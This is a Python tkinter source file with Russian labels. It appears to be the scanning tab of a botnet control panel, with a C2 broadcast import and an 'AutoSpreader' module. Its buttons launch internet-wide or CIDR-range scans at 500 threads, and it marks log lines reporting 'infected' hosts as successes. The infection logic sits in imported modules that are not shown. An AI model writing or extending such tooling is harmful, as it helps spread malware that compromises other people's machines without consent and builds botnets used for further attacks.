import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import json, os, threading, queue, ipaddress, time
from botnet.c2 import broadcast_command
from utils.logger import log
from utils.widgets import ToolTip
from botnet.auto_spreader import AutoSpreader

class BotScanTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.spreader = AutoSpreader()
        self.build_ui()

    def build_ui(self):
        settings_frame = ttk.LabelFrame(self, text="Параметры")
        settings_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(settings_frame, text="Диапазон (CIDR):").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.scan_target = ttk.Entry(settings_frame, width=30)
        self.scan_target.grid(row=0, column=1, padx=5)
        self.scan_target.insert(0, "192.168.1.0/24")
        ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.scan_threads = ttk.Entry(settings_frame, width=10)
        self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
        self.scan_threads.insert(0, "500")
        
        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="Сканировать интернет", command=self.scan_internet).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Остановить", command=self.stop_scan).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Сохранить лог", command=self.save_log).pack(side=tk.LEFT, padx=2)
        
        self.progress_var = tk.IntVar()
        self.progress_bar = ttk.Progressbar(self, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, padx=5, pady=2)
        
        self.scan_log = scrolledtext.ScrolledText(self, height=12, state=tk.NORMAL, font=('Consolas', 10))
        self.scan_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.scan_log.tag_configure('success', foreground='#00cc00')
        self.scan_log.tag_configure('error', foreground='#ff4444')
        self.scan_log.tag_configure('warning', foreground='#ffaa00')
        self.scan_log.tag_configure('info', foreground='#cccccc')
        
        self.process_messages()

    def log_to_scan(self, message):
        tag = 'info'
        lower = message.lower()
        if 'заражён' in lower or 'success' in lower or '[+]' in lower:
            tag = 'success'
        elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
            tag = 'error'
        elif 'warning' in lower:
            tag = 'warning'
        self.scan_log.insert(tk.END, message + "\n", tag)
        self.scan_log.see(tk.END)

    def copy_log(self):
        self.clipboard_clear()
        self.clipboard_append(self.scan_log.get(1.0, tk.END))
        messagebox.showinfo("Скопировано", "Лог скопирован")

    def save_log(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if filename:
            with open(filename, 'w') as f:
                f.write(self.scan_log.get(1.0, tk.END))
            messagebox.showinfo("Сохранено", f"Лог сохранён в {filename}")

    def process_messages(self):
        try:
            while True:
                msg = self.spreader.message_queue.get_nowait()
                self.log_to_scan(msg)
                if "[Progress]" in msg:
                    try:
                        pct = int(msg.split("(")[1].split("%")[0])
                        self.progress_var.set(pct)
                    except: pass
        except queue.Empty:
            pass
        self.after(100, self.process_messages)

    def scan_internet(self):
        self.spreader.stop()
        self.spreader.load_settings("avz_settings.json")
        self.spreader.worker_threads = int(self.scan_threads.get())
        self.spreader.interval = 0
        self.progress_var.set(0)
        threading.Thread(target=self.spreader.start, daemon=True).start()

    def scan_range(self):
        target = self.scan_target.get()
        if not target: return
        if '/' in target:
            try:
                network = ipaddress.IPv4Network(target, strict=False)
                targets = [str(host) for host in network.hosts()]
            except:
                messagebox.showerror("Ошибка", "Некорректный CIDR")
                return
        else:
            targets = [target]
        self.progress_var.set(0)
        self.spreader.scan_once(targets)

    def stop_scan(self):
        self.spreader.stop()
        self.log_to_scan("[Сканирование] Остановлено")
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"scan_log_{timestamp}.txt"
        with open(filename, 'w') as f:
            f.write(self.scan_log.get(1.0, tk.END))
        self.log_to_scan(f"[Auto] Лог сохранён: {filename}")
